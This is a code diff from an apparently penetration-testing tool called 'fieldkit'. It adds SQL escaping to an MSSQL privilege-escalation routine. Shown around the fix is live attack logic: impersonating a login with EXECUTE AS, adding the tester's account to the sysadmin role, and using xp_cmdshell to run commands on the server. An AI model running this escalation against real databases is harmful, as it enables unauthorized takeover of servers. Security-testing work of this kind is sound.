@@ -36,8 +36,15 @@ _XP_TEST = "EXEC master..xp_cmdshell 'echo FK:XPOK'"
 _XP_DISABLE = "EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE"
 
 
+def _lit(s):
+    """Escape a value for a T-SQL single-quoted string literal. Login/user names come
+    from the (untrusted) target DB's own enumeration; a name with an apostrophe would
+    otherwise break — or inject into — fieldkit's own escalation query."""
+    return str(s).replace("'", "''")
+
+
 def _as_login(login, inner):
-    return f"EXECUTE AS LOGIN='{login}';{inner};REVERT"
+    return f"EXECUTE AS LOGIN='{_lit(login)}';{inner};REVERT"
 
 
 def _query_argv(cred, ip, sql):
@@ -132,12 +139,12 @@ def escalate_privs(store, host, cred, *, run=None, allow_config_change=False, on
     if rep.impersonatable:
         login = rep.impersonatable[0]
         emit(f"  escalating: EXECUTE AS {login} → add {me} to sysadmin, then xp_cmdshell")
-        query(_as_login(login, f"EXEC sp_addsrvrolemember '{me}','sysadmin'"))
+        query(_as_login(login, f"EXEC sp_addsrvrolemember '{_lit(me)}','sysadmin'"))
         ok, out = xp_works()
         if ok:
             rep.status = "escalated"
             rep.via = login
-            drop = _as_login(login, f"EXEC sp_dropsrvrolemember '{me}','sysadmin'")
+            drop = _as_login(login, f"EXEC sp_dropsrvrolemember '{_lit(me)}','sysadmin'")
             _establish_exec(
                 store, host, cred, ip, proof=out,
                 report_type="mssql_impersonation",
